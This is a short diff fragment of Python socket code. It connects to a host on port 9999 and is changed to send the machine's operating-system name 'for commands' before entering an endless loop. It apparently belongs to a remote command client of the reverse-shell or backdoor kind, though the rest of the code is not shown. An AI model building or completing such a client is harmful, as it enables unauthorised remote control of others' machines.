@@ -10,7 +10,8 @@ port = 9999
 
 s.connect((host,port))
 name = platform.system().encode('utf-8')
-#s.send(name)
+#send OS type for commands
+s.send(name)
 
 while True:
     
